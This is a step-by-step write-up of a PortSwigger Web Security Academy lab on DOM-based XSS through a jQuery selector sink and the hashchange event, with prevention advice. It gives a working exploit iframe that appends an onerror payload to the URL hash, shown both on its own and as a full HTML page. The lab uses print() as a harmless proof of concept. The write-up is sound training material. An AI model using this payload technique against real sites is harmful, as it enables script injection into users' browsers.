# Lab: DOM XSS in jQuery selector sink using a hashchange event

## Lab Description

This lab contains a **DOM-based cross-site scripting** vulnerability on the home page. It uses jQuery's `$()` selector function to auto-scroll to a given post, whose title is passed via the `location.hash` property.

**Goal:** Deliver an exploit to the victim that calls the `print()` function in their browser.

**Difficulty:** APPRENTICE

---

## Solution

### Step 1: Understanding the Vulnerability

The vulnerable code on the home page uses jQuery's `$()` selector to handle hashchange events. The `location.hash` value is directly passed to the selector, allowing XSS if an attacker can inject HTML/JavaScript.

Example vulnerable pattern:
```javascript
$(window).on('hashchange', function() {
    var post = location.hash.slice(1);
    $(post).scrollIntoView();
});
If location.hash contains something like '<img src=x onerror=print()>', jQuery will parse it as HTML and execute the onerror handler.

Step 2: Exploit Strategy
We'll create an iframe that:

Loads the lab homepage with a # hash

On load, appends a malicious payload (<img src=x onerror=print()>) to the hash

This triggers the hashchange event and executes print()

Step 3: Crafting the Exploit
Malicious iframe code:

html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
Replace YOUR-LAB-ID with your actual lab ID (e.g., 0a1b2c3d4e5f6g7h8i9j).

How it works:

Initial src: https://lab-id.net/#

After onload: src becomes https://lab-id.net/#<img src=x onerror=print()>

jQuery selector parses the hash as HTML and executes print()

Step 4: Delivering the Exploit
Open Burp Suite or your browser's DevTools

From the lab banner, click "Exploit server"

In the "Body" section, paste the malicious iframe:

html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
Click "Store" to save the exploit

Step 5: Testing the Exploit
Click "View exploit"

The browser should trigger the print() dialog

If the print dialog appears, the exploit works ✅

Step 6: Solving the Lab
Return to the exploit server

Click "Deliver to victim"

The lab will automatically solve and display the success message

Final Exploit Code (Full HTML)
html
<!DOCTYPE html>
<html>
<head>
    <title>DOM XSS Exploit - jQuery Selector Sink</title>
</head>
<body>
    <h3>Delivering exploit...</h3>
    <iframe 
        src="https://YOUR-LAB-ID.web-security-academy.net/#" 
        onload="this.src+='<img src=x onerror=print()>'">
    </iframe>
</body>
</html>
Replace YOUR-LAB-ID with your actual lab ID.

Key Takeaways
Concept	Explanation
jQuery selector sink	$() interprets hash as HTML when it contains angle brackets
hashchange event	Triggered when location.hash changes, allowing persistent XSS
onload + src modification	Technique to append payload after initial load
print() function	Used as harmless proof-of-concept for XSS
Prevention
Avoid passing user-controlled input to jQuery selectors

Use document.getElementById() or document.querySelector() with sanitization

Implement strict Content Security Policy (CSP)

Validate and escape location.hash before use

References
PortSwigger: DOM XSS in jQuery selector sink

jQuery Security

DOM-based XSS Cheat Sheet
